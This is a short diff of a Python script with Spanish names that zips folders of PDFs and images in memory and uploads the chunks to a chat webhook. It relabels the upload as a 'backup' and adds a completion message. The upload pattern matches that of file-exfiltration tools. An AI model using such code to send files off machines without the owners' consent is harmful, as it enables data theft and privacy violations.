@@ -40,7 +40,6 @@ def enviar_por_partes_desde_memoria(buffer_zip, nombre_carpeta):
     
     while offset < total_bytes:
         chunk = buffer_bytes[offset:offset + TAMANO_PARTE]
-
         nombre_archivo = f"PART{parte_num:03d}{nombre_carpeta}_PDFS_IMGS.zip"
         
         try:
@@ -49,7 +48,7 @@ def enviar_por_partes_desde_memoria(buffer_zip, nombre_carpeta):
                 files={
                     "file": (nombre_archivo, chunk),
                     "payload_json": (None, json.dumps({
-                        "content": f"Copia de **{nombre_carpeta}** (Parte {parte_num})"
+                        "content": f"📁 Respaldo de **{nombre_carpeta}** (Parte {parte_num})"
                     }))
                 },
                 timeout=30
@@ -59,6 +58,15 @@ def enviar_por_partes_desde_memoria(buffer_zip, nombre_carpeta):
             
         offset += TAMANO_PARTE
         parte_num += 1
+
+    try:
+        requests.post(
+            WEBHOOK_URL,
+            json={"content": f"se han enviado todas las partes uwu ({nombre_carpeta})"},
+            timeout=15
+        )
+    except Exception:
+        pass
 
 def procesar_y_enviar():
     for nombre, ruta in CARPETAS.items():
